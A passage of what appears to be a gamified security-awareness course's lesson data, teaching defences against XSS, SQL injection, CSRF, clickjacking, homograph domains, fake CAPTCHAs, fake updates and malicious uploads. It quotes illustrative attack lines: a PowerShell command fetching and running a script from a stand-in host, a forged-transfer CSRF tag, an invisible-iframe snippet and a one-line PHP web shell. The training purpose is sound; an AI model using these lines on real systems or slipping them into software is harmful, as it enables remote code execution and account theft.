                  <div class="text-slate-300">2. Page Loaded</div>
                  <p class="text-slate-500">Browser downloads comment from DB.</p>
                </div>
                <div class="p-2 bg-slate-900 rounded border border-slate-800" id="xss-step-3">
                  <div class="text-slate-300">3. Execution</div>
                  <p class="text-slate-500">Browser runs injected JavaScript code.</p>
                </div>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Render comment output using HTML escaping / character encoding",
            correct: true,
            feedback: "Perfect! Encoding characters like `<` as `&lt;` ensures that the browser displays the script tag as plain text rather than executing it.",
            xpReward: 180
          },
          {
            label: "Only validate input on the client-side using JavaScript regex",
            correct: false,
            feedback: "Wrong. Client-side validation can easily be bypassed by sending the request directly to the API server using Curl or Postman."
          },
          {
            label: "Convert all comments to lowercase",
            correct: false,
            feedback: "Incorrect. The browser will still run `<script>` tags even if it is lowercase, or they can use variations that don't depend on case."
          }
        ]
      }
    ]
  },
  {
    id: 9,
    title: "SQL Injection Awareness",
    difficulty: "Advanced",
    time: "5 mins",
    xp: 220,
    icon: "database",
    goal: "See how unsanitized database queries can be exploited, and how parameterized inputs resolve it.",
    summary: "SQL Injection occurs when user inputs are directly concatenated into a SQL query string. This allows attackers to manipulate the query logic, bypass authentication, or read raw database tables.",
    tips: [
      "Always use Prepared Statements (Parameterized Queries).",
      "Validate and sanitize inputs using typed variables.",
      "Employ the Principle of Least Privilege for database users."
    ],
    steps: [
      {
        id: 1,
        title: "Manipulating SQL Queries",
        description: "Try logging in using a normal password or injecting special characters to break query logic.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-2 rounded border border-slate-800 text-xs mb-3">
              <span class="text-cyan-400">Database Authentication Test</span>
            </div>

            <div class="bg-slate-850 p-4 rounded border border-slate-700 space-y-3 flex-1">
              <div>
                <label class="text-[10px] text-slate-400 block mb-1">Username / Email</label>
                <input type="text" id="sql-username" class="w-full bg-slate-900 border border-slate-700 text-xs p-2 rounded text-slate-300" placeholder="admin">
              </div>
              <div>
                <label class="text-[10px] text-slate-400 block mb-1">Password</label>
                <input type="text" id="sql-password" class="w-full bg-slate-900 border border-slate-700 text-xs p-2 rounded text-slate-300" placeholder="Password">
              </div>
              <div class="flex space-x-2">
                <button id="btn-sql-preset" class="flex-1 bg-slate-800 hover:bg-slate-750 text-[10px] py-1 px-2 rounded border border-slate-700 text-amber-400">Preset Injection</button>
                <button id="btn-sql-submit" class="flex-1 bg-cyan-500 hover:bg-cyan-450 text-slate-950 font-bold text-xs py-1 px-2 rounded">Submit Login</button>
              </div>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">BACKEND SQL ENGINE</div>
              
              <div class="bg-slate-950 p-3 rounded border border-slate-850 space-y-2">
                <div class="text-slate-400 text-[10px]">Active Database Query:</div>
                <code class="block bg-slate-900 p-2 text-slate-300 text-[10px] whitespace-pre-wrap break-all" id="sql-query-display">
  SELECT * FROM users WHERE username = 'admin' AND password = '';
                </code>
                <div class="text-[10px] text-amber-500 mt-2" id="sql-evaluation-result">
                  Evaluating Query logic...
                </div>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Use Prepared Statements (Parameterized Queries)",
            correct: true,
            feedback: "Correct! Prepared statements compile the SQL query template first, and then pass the parameters securely. This ensures user input is treated strictly as data, never executable code.",
            xpReward: 220
          },
          {
            label: "Filter out all single quotes and spaces on the client-side",
            correct: false,
            feedback: "Wrong! Attackers can bypass client filters or use encoding (like URL or HEX representation) to trigger the injection inside the database engine."
          },
          {
            label: "Encrypt the database password field using hashing algorithms",
            correct: false,
            feedback: "Incorrect. Password hashing is a best practice for storing credentials, but it does not prevent SQL Injection since the logic bypass happens before password validation."
          }
        ]
      }
    ]
  },
  {
    id: 10,
    title: "CSRF Awareness",
    difficulty: "Advanced",
    time: "4 mins",
    xp: 200,
    icon: "link-2",
    goal: "Learn how Cross-Site Request Forgery works, and how anti-CSRF tokens block fake requests.",
    summary: "CSRF forces an authenticated browser to submit unauthorized requests to a site. If the target site relies solely on session cookies, it accepts the request because the browser automatically attaches cookies.",
    tips: [
      "Use unique Anti-CSRF Tokens validated on the server.",
      "Enforce SameSite=Strict or SameSite=Lax flags on session cookies.",
      "Require user confirmation (OTP/re-authentication) for critical operations."
    ],
    steps: [
      {
        id: 1,
        title: "Malicious Cat Video Website",
        description: "You are logged in to 'bank.com'. You visit a funny cat video site in a different tab.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-2 rounded border border-slate-800 text-xs mb-3">
              <span class="text-amber-400">🌐 Active Tab: cutecatvideos.org</span>
            </div>

            <div class="bg-white text-slate-800 p-4 rounded flex-1 flex flex-col items-center justify-center">
              <div class="w-16 h-16 rounded-full bg-slate-200 flex items-center justify-center text-2xl mb-2">🐱</div>
              <h3 class="font-bold text-sm">Cute Cat Playing with Yarn!</h3>
              <p class="text-xs text-slate-500 text-center mt-1">This site secretly contains a hidden HTML element:</p>
              
              <code class="block bg-slate-100 p-2 rounded text-[9px] text-red-600 font-mono mt-2 w-full text-center">
                &lt;img src="http://bank.com/transfer?to=attacker&amount=1000" width="0" height="0" /&gt;
              </code>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">REQUEST INTERCEPT LOG</div>
              
              <div class="bg-slate-950 p-3 rounded border border-slate-850 space-y-2 text-[10px]">
                <div>Browser triggers fetch: <code class="text-red-400">GET http://bank.com/transfer</code></div>
                <div class="text-slate-400">Cookie Auto-Attached: <code class="text-emerald-400">session_id=123456</code></div>
                <div class="text-amber-400 font-bold">// Bank server executes:</div>
                <div class="text-slate-500">Transferred $1000 to Attacker! Session authenticated successfully.</div>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Validate Anti-CSRF Tokens on the server and use SameSite cookie flags",
            correct: true,
            feedback: "Correct! Anti-CSRF tokens ensure the request contains a unique key that the malicious tab cannot read. SameSite=Strict prevents the browser from sending cookies on cross-site link requests.",
            xpReward: 200
          },
          {
            label: "Log out of bank websites manually before viewing other tabs",
            correct: false,
            feedback: "While it works, relying on human action is unsafe. Security should be enforced by default by the application architecture."
          },
          {
            label: "Restrict all banking requests to be POST requests",
            correct: false,
            feedback: "Wrong. CSRF can easily be triggered using automated POST requests by embedding hidden forms and trigger scripts in malicious pages."
          }
        ]
      }
    ]
  },
  {
    id: 11,
    title: "Clickjacking Awareness",
    difficulty: "Intermediate",
    time: "3 mins",
    xp: 150,
    icon: "mouse-pointer",
    goal: "Learn how transparent iframes are used to trick users into performing hidden actions.",
    summary: "Clickjacking overlays an invisible iframe of a target site over a decoy page. When the user clicks the decoy button, they are actually clicking the target button underneath.",
    tips: [
      "Set the `X-Frame-Options: DENY` or `SAMEORIGIN` header.",
      "Use Content-Security-Policy (CSP) with `frame-ancestors 'self'` directive.",
      "Avoid embedding sensitive components inside iframes."
    ],
    steps: [
      {
        id: 1,
        title: "Invisible Overlay Slider",
        description: "Move the slider to reveal the hidden iframe alignment on this page.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="mb-3">
              <label class="text-xs text-slate-400 block mb-1">Adjust Iframe Opacity (0% to 100%):</label>
              <input type="range" id="clickjack-slider" min="0" max="100" value="0" class="w-full h-1 bg-slate-700 rounded-lg appearance-none cursor-pointer">
            </div>

            <!-- Sandbox Frame -->
            <div class="relative bg-slate-950 rounded border border-slate-800 flex-1 overflow-hidden">
              <!-- Decoy View -->
              <div class="absolute inset-0 flex flex-col items-center justify-center p-4 text-center">
                <div class="text-3xl animate-bounce mb-2">🎁</div>
                <h4 class="text-cyan-400 font-bold text-sm">YOU WON A FREE iPHONE!</h4>
                <button class="mt-4 bg-yellow-500 text-slate-900 font-bold px-6 py-2 rounded-lg text-xs pointer-events-none">CLAIM NOW</button>
              </div>

              <!-- Target Hidden View -->
              <div id="hidden-iframe" class="absolute inset-0 bg-slate-800/90 flex flex-col items-center justify-center p-4 border border-red-500/50 rounded pointer-events-none opacity-0 transition-opacity duration-300">
                <div class="text-xs text-red-400 font-bold font-mono uppercase mb-2">Target Iframe: bank.com</div>
                <div class="bg-slate-900 p-3 rounded border border-slate-750 text-center w-full max-w-xs space-y-2">
                  <div class="text-[11px]">Confirm Transfer of <span class="text-yellow-400 font-semibold">$5,000</span>?</div>
                  <button class="bg-red-600 text-white px-4 py-1.5 rounded text-[10px] font-bold w-full">CONFIRM TRANSFER</button>
                </div>
              </div>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">REDRESS ATTACK ARCHITECTURE</div>
              
              <p class="text-[10px] text-slate-400 leading-relaxed">
                By setting the iframe's CSS opacity to <code class="text-red-400 bg-slate-900 px-1 py-0.5 rounded">0.0</code>, the hacker places your bank's transfer button directly underneath the "CLAIM NOW" button.
              </p>
              <div class="text-[10px] bg-slate-950 p-2 rounded border border-slate-850 text-slate-500">
                // Attack Structure<br>
                &lt;iframe src="http://bank.com" style="opacity:0; z-index:100"&gt;
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Enforce X-Frame-Options: SAMEORIGIN header on the server side",
            correct: true,
            feedback: "Perfect! By specifying X-Frame-Options or CSP, the browser blocks the website from being embedded within an iframe on external sites, neutralizing clickjacking.",
            xpReward: 150
          },
          {
            label: "Add an extra confirmation dialogue using JavaScript in the decoy button",
            correct: false,
            feedback: "Wrong. The user is clicking the hidden iframe directly, which bypasses any JavaScript running on the decoy page completely."
          },
          {
            label: "Increase the size of all checkout buttons",
            correct: false,
            feedback: "Incorrect. Changing button sizes does not prevent attackers from resizing their transparent iframe accordingly to overlay them."
          }
        ]
      }
    ]
  },
  {
    id: 12,
    title: "URL Spoofing (Homograph Attack)",
    difficulty: "Intermediate",
    time: "3 mins",
    xp: 140,
    icon: "globe",
    goal: "Learn how International Domain Names (IDN) are exploited to spoof legitimate brands.",
    summary: "Homograph attacks use character sets like Cyrillic or Greek to register domains that look identical to official brands. Browsers display Punycode for mixed-character domains to notify users.",
    tips: [
      "Examine Punycode domains (domains starting with `xn--`).",
      "Use modern browsers that automatically translate internationalized domains to Punycode.",
      "Bookmark your frequent banking and e-commerce websites."
    ],
    steps: [
      {
        id: 1,
        title: "Identify Lookalike Characters",
        description: "Compare the visual representation of characters from different alphabets.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-3 rounded border border-slate-800 space-y-3 flex-1 flex flex-col justify-center">
              <div class="text-xs font-semibold text-cyan-400">// Visual Domain Comparison</div>
              
              <div class="space-y-2 mt-3">
                <div class="flex justify-between items-center bg-slate-900 p-2 rounded">
                  <span class="text-xs">Original domain:</span>
                  <span class="font-mono text-emerald-400 font-bold">apple.com</span>
                </div>
                <div class="flex justify-between items-center bg-slate-900 p-2 rounded">
                  <span class="text-xs">Spoofed domain:</span>
                  <span class="font-mono text-red-400 font-bold" id="spoofed-domain-display">аpple.com</span>
                </div>
              </div>

              <button id="btn-toggle-puny" class="mt-4 w-full bg-slate-800 hover:bg-slate-700 text-xs py-2 rounded text-cyan-400 border border-slate-700 transition">Show Punycode Translation</button>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">PUNYCODE CONVERTER</div>
              
              <div class="bg-slate-950 p-3 rounded border border-slate-850 text-[10px] space-y-2">
                <div>Character Analysed:</div>
                <div class="text-amber-400">"а" (Cyrillic Small Letter A)</div>
                <div>Unicode: <code class="text-slate-300">U+0430</code></div>
                <div>Standard English 'a' Unicode: <code class="text-slate-300">U+0061</code></div>
                <div class="text-red-400 font-bold">Punycode Conversion:</div>
                <code class="block bg-slate-900 p-1 text-slate-300 text-[10px]" id="punycode-result">
                  xn--pple-43d.com
                </code>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Check the Punycode domain representation and keep browsers updated",
            correct: true,
            feedback: "Correct! If a domain converts to a Punycode string starting with `xn--`, it indicates mixed alphabet sets, often used for spoofing. Modern browsers auto-display Punycode in URL bars to alert you.",
            xpReward: 140
          },
          {
            label: "Rely strictly on HTTPS lock icons to determine legitimacy",
            correct: false,
            feedback: "Wrong. Attackers can register the spoofed domain `xn--pple-43d.com` and obtain a valid SSL certificate, so the lock icon will still be active."
          },
          {
            label: "Check the page layout and quality of images to confirm brand authenticity",
            correct: false,
            feedback: "Incorrect. Hackers copy high-resolution brand assets directly, making the fake website visually indistinguishable from the official site."
          }
        ]
      }
    ]
  },
  {
    id: 13,
    title: "Fake CAPTCHA Scam",
    difficulty: "Intermediate",
    time: "3 mins",
    xp: 130,
    icon: "shield-question",
    goal: "Identify deceptive CAPTCHAs that instruct users to execute terminal scripts.",
    summary: "A new phishing tactic involves presenting a fake 'Verify you are human' page. It asks you to press a key shortcut (like Win+R), paste a copied command, and press Enter, which executes a malicious script.",
    tips: [
      "No legitimate verification system (Cloudflare, reCAPTCHA) will ever ask you to open command prompts.",
      "Never copy and paste commands from untrusted sites into your terminal.",
      "Close the website immediately if it requests system commands."
    ],
    steps: [
      {
        id: 1,
        title: "Fake Cloudflare Verification",
        description: "You want to access a website but are blocked by a security gate. Read the instructions carefully.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-white text-slate-800 p-5 rounded-lg flex-1 flex flex-col items-center justify-center space-y-4">
              <div class="w-12 h-12 bg-orange-100 rounded-full flex items-center justify-center text-orange-500 font-bold text-lg">CF</div>
              <h3 class="text-sm font-bold text-center">Checking if the site connection is secure</h3>
              <p class="text-[11px] text-slate-500 text-center">Please verify that you are human to proceed.</p>
              
              <div class="bg-slate-100 p-3 rounded border border-slate-200 text-left text-[10px] space-y-2 w-full max-w-xs font-mono">
                <div class="font-bold text-slate-700">1. Press <span class="bg-slate-300 px-1 py-0.5 rounded">Windows Key + R</span></div>
                <div class="font-bold text-slate-700">2. Press <span class="bg-slate-300 px-1 py-0.5 rounded">Ctrl + V</span> to paste verification code</div>
                <div class="font-bold text-slate-700">3. Press <span class="bg-slate-300 px-1 py-0.5 rounded">Enter</span> to complete verification</div>
              </div>
              
              <button id="btn-copy-captcha" class="bg-orange-500 text-white font-semibold text-xs px-4 py-2 rounded hover:bg-orange-600 transition">Copy Verification Code</button>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">CLIPBOARD ANALYSIS</div>
              
              <div class="bg-slate-950 p-3 rounded border border-slate-850 text-[10px] space-y-2">
                <div class="text-slate-400">Secretly copied payload to clipboard:</div>
                <code class="block bg-slate-900 p-2 text-red-400 text-[8px] overflow-x-auto whitespace-nowrap">
                  powershell -w hidden -c "irm https://scam.net/payload.ps1 | iex"
                </code>
                <p class="text-slate-500">
                  Clicking "Copy" loads a command that downloads and executes remote malware. Win+R opens the Windows Run dialog directly.
                </p>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Follow the steps to pass the verification screen",
            correct: false,
            feedback: "Wrong! This is a dangerous social engineering trap. Running this in your Command Prompt/Run bar runs arbitrary code from an attacker, compromising your entire OS."
          },
          {
            label: "Close the page immediately and do not run any commands",
            correct: true,
            feedback: "Excellent! No authentic service requires you to run shell scripts. Closing the website is the only secure action.",
            xpReward: 130
          },
          {
            label: "Submit a support ticket to Cloudflare complaining about the interface",
            correct: false,
            feedback: "Incorrect. The page is not actually Cloudflare; it's a completely fake webpage designed to impersonate them. Contacting them won't block the site instantly."
          }
        ]
      }
    ]
  },
  {
    id: 14,
    title: "Browser Notification Scam",
    difficulty: "Beginner",
    time: "2 mins",
    xp: 100,
    icon: "bell",
    goal: "Avoid subscribing to spam notifications that feed malware redirects.",
    summary: "Websites request permission to send notifications. Scammers use this to send persistent popup advertisements that impersonate system antivirus warnings, tricking users into installing Trojans.",
    tips: [
      "Never click 'Allow' on notification popups from streaming, torrent, or unknown websites.",
      "Manage notification permissions in browser settings (chrome://settings/content/notifications).",
      "Disable notification prompts globally if you do not use them."
    ],
    steps: [
      {
        id: 1,
        title: "Click Allow Alert",
        description: "A streaming website asks for notifications. Decide whether to grant permissions.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-2 rounded-lg border border-slate-800 relative flex-1 flex flex-col justify-center items-center">
              
              <!-- Mock Notification Popup -->
              <div class="absolute top-2 left-2 bg-white text-slate-850 p-3 rounded-lg shadow-xl border border-slate-200 flex items-center space-x-3 w-[280px]">
                <div class="text-xl">🔔</div>
                <div class="flex-1">
                  <div class="text-xs font-bold">free-movies-hd.com</div>
                  <div class="text-[10px] text-slate-500">wants to show notifications</div>
                  <div class="flex space-x-2 mt-2 justify-end">
                    <button id="btn-notify-block" class="bg-slate-200 hover:bg-slate-350 px-3 py-1 rounded text-[10px] font-semibold text-slate-800">Block</button>
                    <button id="btn-notify-allow" class="bg-cyan-500 hover:bg-cyan-600 px-3 py-1 rounded text-[10px] font-bold text-white">Allow</button>
                  </div>
                </div>
              </div>

              <div class="text-center p-4 pt-12 space-y-2">
                <div class="text-3xl text-slate-600">▶️</div>
                <div class="text-xs text-slate-400">Click "Allow" above to watch your video stream.</div>
              </div>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">NOTIFICATION VECTOR</div>
              
              <div class="bg-slate-950 p-3 rounded border border-slate-850 text-[10px] space-y-1">
                <div class="text-amber-400 font-bold">// Trigger Result:</div>
                <p class="text-slate-400">Once allowed, the server registers a ServiceWorker push key. The hacker can send fake popups even when browser tabs are closed.</p>
                <div class="text-red-400 font-bold mt-2">Example Notification Received:</div>
                <div class="bg-slate-900 p-2 rounded border border-red-950 text-[9px]">
                  <strong>⚠️ SYSTEM INFECTED!</strong><br>
                  Windows Defender detected 15 Trojans. Click here to clean now.
                </div>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Click Allow so you can watch the movie",
            correct: false,
            feedback: "Wrong! Clicking Allow opens the door to persistent spam notifications on your desktop, designed to look like system warnings that lead to malware downloads."
          },
          {
            label: "Click Block, and configure browser settings to auto-deny notifications",
            correct: true,
            feedback: "Perfect! Denying permission stops the notification subscription. Configuring browser settings protects you globally.",
            xpReward: 100
          },
          {
            label: "Click Allow, but use a VPN to browse securely",
            correct: false,
            feedback: "Incorrect. A VPN encrypts network traffic, but it does not block application-level notifications that you have explicitly allowed in browser prompts."
          }
        ]
      }
    ]
  },
  {
    id: 15,
    title: "Fake Update Alert",
    difficulty: "Beginner",
    time: "2 mins",
    xp: 100,
    icon: "refresh-cw",
    goal: "Avoid installing fake browser or software updates hosted on malicious websites.",
    summary: "Malicious websites display warning screens claiming your browser, media player, or OS is outdated, prompting you to download a critical patch file that contains a Trojan.",
    tips: [
      "Browsers update automatically in the background or require verification via official settings panels.",
      "Never run `.exe`, `.msi`, or script updates downloaded from pop-up banners.",
      "Check official application websites to verify available patches."
    ],
    steps: [
      {
        id: 1,
        title: "Outdated Browser Warning",
        description: "A page states your browser is vulnerable. Review your update procedure.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-6 rounded-lg border border-slate-800 text-center flex-1 flex flex-col justify-center items-center space-y-4">
              <div class="text-red-400 text-4xl font-bold animate-pulse">⚠️</div>
              <h2 class="text-base font-bold text-red-400">CRITICAL SECURITY EXPLOIT DETECTED!</h2>
              <p class="text-xs text-slate-400 max-w-xs">
                Your Chrome Browser version is out-of-date and vulnerable to remote execution. You must install the latest patch immediately.
              </p>
              
              <div class="bg-slate-900 p-3 rounded text-[11px] border border-slate-750 font-mono text-left w-full max-w-xs space-y-1">
                <div>File: <span class="text-cyan-400">chrome_patch_v124.exe</span></div>
                <div>Size: 1.2 MB</div>
                <div>Status: Ready for download</div>
              </div>

              <div class="flex space-x-2 w-full max-w-xs">
                <button id="btn-update-cancel" class="flex-1 bg-slate-800 hover:bg-slate-700 py-2 rounded text-xs">Ignore</button>
                <button id="btn-update-download" class="flex-1 bg-red-600 hover:bg-red-500 py-2 rounded text-xs font-bold text-white">Download Update</button>
              </div>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">INFECTION TIMELINE</div>
              
              <div class="space-y-2 text-[10px] text-slate-400">
                <div class="flex items-center space-x-2">
                  <span class="text-red-400">●</span>
                  <span>1. User clicks download</span>
                </div>
                <div class="flex items-center space-x-2">
                  <span class="text-red-400">●</span>
                  <span>2. Executable runs locally</span>
                </div>
                <div class="flex items-center space-x-2">
                  <span class="text-red-400">●</span>
                  <span>3. Malware bypasses UAC</span>
                </div>
                <div class="flex items-center space-x-2">
                  <span class="text-red-400">●</span>
                  <span>4. Infostealer steals credentials</span>
                </div>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Download and run the update file to secure your browser",
            correct: false,
            feedback: "Wrong! Chrome updates automatically or prompts you inside the official browser settings menu. Banners claiming vulnerabilities are scams distributing malware."
          },
          {
            label: "Close the page, open Chrome Settings, and check for updates officially",
            correct: true,
            feedback: "Correct! The only safe way to verify and run browser updates is through the browser's own settings panel (Help -> About Google Chrome).",
            xpReward: 100
          },
          {
            label: "Scan the downloaded file using a simple browser virus check",
            correct: false,
            feedback: "Incorrect. Freshly compiled malware often evades browser static filters using obfuscation. It is safer to never download it at all."
          }
        ]
      }
    ]
  },
  {
    id: 16,
    title: "Malicious Download (Double Extensions)",
    difficulty: "Intermediate",
    time: "3 mins",
    xp: 130,
    icon: "download",
    goal: "Learn how attackers hide executable programs behind double extensions and fake icons.",
    summary: "Windows and other OS platforms hide file extensions by default. Attackers use this to name files like `report.pdf.exe` with a PDF icon. The user only sees `report.pdf`, but clicking it executes code.",
    tips: [
      "Always enable 'Show file extensions' in your operating system settings.",
      "Check the 'Type' column in your file explorer before executing any downloaded assets.",
      "Be wary of double extensions: `.pdf.exe`, `.txt.scr`, `.docx.lnk`."
    ],
    steps: [
      {
        id: 1,
        title: "File Explorer Inspection",
        description: "You downloaded an invoice. Inspect the files in your download folder.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-2 rounded border border-slate-800 text-xs mb-3 flex justify-between items-center">
              <span>📂 Downloads Directory</span>
              <button id="btn-toggle-ext" class="bg-slate-800 hover:bg-slate-700 text-[10px] px-2 py-0.5 rounded text-cyan-400 border border-slate-700">Toggle Extensions</button>
            </div>

            <!-- Mock Explorer -->
            <div class="flex-1 bg-slate-950 p-3 rounded border border-slate-850 space-y-2 text-xs">
              <div class="grid grid-cols-3 font-semibold border-b border-slate-800 pb-2 text-[10px] text-slate-400">
                <span>Name</span>
                <span>Type</span>
                <span>Size</span>
              </div>
              
              <div class="grid grid-cols-3 p-2 bg-slate-900/60 rounded items-center">
                <span class="flex items-center space-x-2">
                  <span>📄</span>
                  <span id="file-name-display">invoice_2026.pdf</span>
                </span>
                <span id="file-type-display" class="text-slate-400">PDF Document</span>
                <span>420 KB</span>
              </div>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">EXTENSION HIJACKING MODEL</div>
              
              <div class="bg-slate-950 p-3 rounded border border-slate-850 text-[10px] space-y-2">
                <div class="text-slate-300">File Signature Audit:</div>
                <p class="text-slate-400">
                  When extensions are hidden, the OS reads the trailing extension (<code class="text-red-400 font-bold">.exe</code>) to run the file but hides it, tricking you into running a script.
                </p>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Double-click the file to open the invoice document",
            correct: false,
            feedback: "Wrong! With extensions hidden, the file is actually `invoice_2026.pdf.exe`. Double-clicking it runs an executable program, installing malware instead of rendering a PDF."
          },
          {
            label: "Enable file extensions, verify the trailing .exe, and delete it",
            correct: true,
            feedback: "Correct! Enabling extensions reveals that the document is an executable file (`.exe`). Deleting it keeps your system safe.",
            xpReward: 130
          },
          {
            label: "Open the file with Notepad to view it safely",
            correct: false,
            feedback: "Incorrect. While it prevents execution, it is better to identify and remove the malicious file entirely."
          }
        ]
      }
    ]
  },
  {
    id: 17,
    title: "Credential Stuffing",
    difficulty: "Advanced",
    time: "4 mins",
    xp: 180,
    icon: "key",
    goal: "Learn how database leaks impact password reuse across multiple services.",
    summary: "Attackers take lists of leaked usernames and passwords from compromised sites (Site A) and use automated scripts to test them on other platforms (Site B, C, D). Unique passwords block this.",
    tips: [
      "Never reuse passwords across different platforms.",
      "Use a password manager to generate and store high-entropy unique credentials.",
      "Enable Multi-Factor Authentication (MFA) to stop unauthorized access."
    ],
    steps: [
      {
        id: 1,
        title: "Automated Attack Console",
        description: "Watch how the credential list is stuffed into various login pages automatically.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-2 rounded border border-slate-850 text-xs mb-3 text-red-400">
              ⚡ Simulated Attacker Botnet Engine
            </div>
            
            <div class="flex-1 bg-slate-950 p-3 rounded font-mono text-[10px] text-slate-350 space-y-1 overflow-y-auto">
              <div>[INFO] Loading credentials list (10,000 items)</div>
              <div>[TRY] target-shop.com | admin@gmail.com : Pass123 - <span class="text-red-400">FAILED</span></div>
              <div>[TRY] target-bank.com | admin@gmail.com : Pass123 - <span class="text-red-400">FAILED</span></div>
              <div class="text-yellow-400 font-bold animate-pulse">[SUCCESS] target-social.com | admin@gmail.com : Pass123 - ACCESS GRANTED</div>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">STUFFING EXPLANATION</div>
              <p class="text-[10px] text-slate-400 leading-relaxed">
                If the user has the same password <code class="text-yellow-400">Pass123</code> on all three sites, a leak on Site A exposes Site B and C to instant automated hijacking.
              </p>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Use unique passwords for each service and activate Multi-Factor Authentication",
            correct: true,
            feedback: "Correct! Unique passwords isolate breaches to one site. MFA acts as a secondary layer that blocks automated logins even if the password is known.",
            xpReward: 180
          },
          {
            label: "Create a very complex password and use it everywhere",
            correct: false,
            feedback: "Wrong. No matter how complex a password is, if the database storing it is compromised, attackers will have it in plain text or decryptable hashes."
          },
          {
            label: "Change passwords every two weeks manually",
            correct: false,
            feedback: "Incorrect. Changing passwords frequently leads to predictable patterns (like PasswordJan, PasswordFeb) which are easily guessed by stuffing algorithms."
          }
        ]
      }
    ]
  },
  {
    id: 18,
    title: "File Upload Security",
    difficulty: "Advanced",
    time: "4 mins",
    xp: 200,
    icon: "file-up",
    goal: "Learn how attackers execute code via unvalidated file uploads.",
    summary: "If a web application allows file uploads (like avatar images) without checking the file's binary signature, an attacker can upload a web shell script (e.g., PHP) and execute terminal commands on the server.",
    tips: [
      "Validate file type on the server using magic bytes/content verification.",
      "Store uploaded files on an isolated CDN or directory with execution permissions disabled.",
      "Randomise and rename file names upon storing."
    ],
    steps: [
      {
        id: 1,
        title: "Profile Avatar Upload",
        description: "Inspect the upload input and attempt to send a profile picture.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-3 rounded-lg border border-slate-800 text-center flex-1 flex flex-col justify-center items-center space-y-3">
              <div class="w-16 h-16 rounded-full bg-slate-800 flex items-center justify-center text-2xl border-2 border-dashed border-slate-700">👤</div>
              <div class="text-xs font-semibold">Upload Profile Photo</div>
              
              <div class="border border-slate-750 p-2 rounded w-full bg-slate-950 text-left">
                <span class="text-[9px] text-slate-500 block">File Selected:</span>
                <span class="text-xs text-red-400 font-mono" id="upload-file-display">avatar.jpg.php</span>
              </div>

              <div class="flex space-x-2 w-full">
                <button id="btn-upload-preset" class="flex-1 bg-slate-800 hover:bg-slate-750 py-1.5 rounded text-[10px] text-amber-400">Load Script Payload</button>
                <button id="btn-upload-submit" class="flex-1 bg-cyan-500 hover:bg-cyan-400 py-1.5 rounded text-xs text-slate-950 font-bold">Upload File</button>
              </div>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">SERVER STORAGE AUDIT</div>
              
              <div class="bg-slate-950 p-3 rounded border border-slate-850 text-[10px] space-y-2">
                <div class="text-slate-400">Stored Path on Server:</div>
                <code class="block bg-slate-900 p-1 text-red-400">/uploads/avatar.jpg.php</code>
                <div class="text-slate-500">// Execution payload:</div>
                <code class="block bg-slate-900 p-1 text-slate-400 text-[9px] truncate">
                  &lt;?php system($_GET['cmd']); ?&gt;
